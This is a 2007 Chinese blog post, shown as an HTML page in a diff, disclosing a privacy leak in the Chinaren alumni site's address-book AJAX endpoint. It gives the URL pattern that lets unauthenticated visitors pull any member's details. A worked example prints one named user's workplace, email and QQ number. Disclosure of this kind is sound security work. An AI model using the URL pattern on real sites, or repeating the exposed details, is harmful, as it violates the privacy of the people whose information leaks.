@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Chinaren有AJAX导致的隐私泄漏漏洞 – est の 输入 输出和出入</title>
+<link rel="icon" href="https://est.im/favicon.svg">
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self' https://disqus.com https://player.bilibili.com https://www.youtube.com;">
+    <link href="https://feeds.feedburner.com/initiative" type="application/rss+xml" rel="alternate" title="est の 输入 输出和出入 RSS Feed" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Chinaren有AJAX导致的隐私泄漏漏洞" />
+
+    <link rel="canonical" href="https://blog.est.im/archives/307964" />
+    <meta property="og:url" content="https://blog.est.im/archives/307964">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Chinaren有AJAX导致的隐私泄漏漏洞">
+
+    <link rel="stylesheet" href="/theme/css/normalize.min.css" />
+    <link rel="stylesheet" href="/theme/css/style.css" />
+
+
+    <style>
+      body {
+        background: #ecedef url("/theme/img/ignasi_pattern_s.png") repeat;
+      }
+    </style>
+  </head>
+  <body class="single-body">
+<nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="/" class="nav-text">
+    est の 输入 输出和出入
+  </a></h1>
+  <div class="hamburger-menu">
+    <button>
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="/" class="hamburger-menu-overlay-link">Home</a></li>
+      <li><a href="https://feeds.feedburner.com/initiative" class="hamburger-menu-overlay-link">RSS</a></li>
+      <li><a href="/about" class="hamburger-menu-overlay-link">About</a></li>
+      <li><a href="/category" class="hamburger-menu-overlay-link">Category</a></li>
+
+    </ul>
+  </div>
+</nav>    <main class="content side-text-padding">
+<article class="post">
+  <header class="post-header">
+    <h2 class="post-title">Chinaren有AJAX导致的隐私泄漏漏洞</h2>
+    <p class="post-date">Posted <time datetime="2007-09-03T04:18:46+08:00">2007-09-03</time> | <span>archive</span></p>
+  </header>
+
+  
+  <p>Chinaren是中国大陆比较大型的同学录网站，界面美观使用方便，但是其 班级通讯录 采用了AJAX无刷新显示技术，导致了隐私泄漏，使得不是班级成员甚至游客可以浏览任意Chinaren成员信息。</p>
+<p>要知道任意用户信息，只需要知道2点：</p>
+<pre><code>1. 该用户所在班级ID，19位数字
+2. 该用户ID
+</code></pre>
+<p>构造URL：</p>
+<p>http://class.chinaren.com/class/class_addressbook.jsp?act=getuserinfo&amp;classuuid=19位的班级ID&amp;userid=用户ID</p>
+<p>例如，在Chinaren里搜索位于北京市，关键词为 高2005级 的所有班级，得到的第一个结果是：</p>
+<p><img alt="image" src="http://wpcache.yo2.cn/wp-content/uploads/74/7487/2007/08/image.png" /></p>
+<p>把查看 创始人：<a href="http://alumni.chinaren.com/class/profile.jsp?userid=gaowei3344520&amp;classuuid=2817034545009278385">高伟</a> 的连接为：http://alumni.chinaren.com/class/profile.jsp?userid=gaowei3344520&amp;classuuid=2817034545009278385</p>
+<p>构造URL：http://class.chinaren.com/class/class_addressbook.jsp?act=getuserinfo&amp;classuuid=2817034545009278385&amp;userid=gaowei3344520</p>
+<p>得到结果：</p>
+<p><code>var userInfoDiv = document.getElementById('user_info_gaowei3344520'); if(userInfoDiv){ var content = '单位： 四川南部英才学校 电话： 邮件： weigao520@eyoucom MSN： - QQ： 182425234 现居地： - - '; userInfoDiv.innerHTML = content; userInfoDiv.style.display = ''; }</code></p>
+</article>
+
+<div class="comments">
+  <h2>Comments</h2>
+  <script type="text/javascript" defer src="https://c.est.im/req4cmt.js"></script>
+</div>    </main>
+
+
+  </body>
+
+</html>
